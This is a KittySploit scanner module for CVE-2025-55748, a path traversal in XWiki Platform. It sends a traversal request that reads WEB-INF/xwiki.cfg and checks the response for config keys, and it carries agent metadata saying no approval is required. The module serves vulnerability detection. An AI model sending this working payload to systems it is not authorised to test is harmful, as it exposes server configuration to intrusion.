#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki Platform 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki Platform - Path Traversal Detection',
        'description': 'XWiki Platform 4.2-milestone-2 through 16.10.6 contains a path traversal caused by improper access control in jsx and sx endpoints, letting remote attackers read configuration files, exploit requires no special privileges.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xwiki', 'lfi', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-m63c-3rmg-r2cf',
            'https://github.com/xwiki/xwiki-platform/commit/9e7b4c03f2143978d891109a17159f73d4cdd318#diff-ee78930a9ac5ea586179fe8ab88a5fd58e369d175927d1e88a0b4dbc3ebcbf1eR62',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-55748',
        ],
        'cve': 'CVE-2025-55748',
    }

    def run(self):
        r = self.http_request(method="GET", path='/bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg&minify=false', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('xwiki.editcomment=', 'xwiki.plugins=', 'xwiki.encoding=',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="XWiki Platform - Path Traversal detected",
                path='/bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg&minify=false',
            )
            return True
        return False

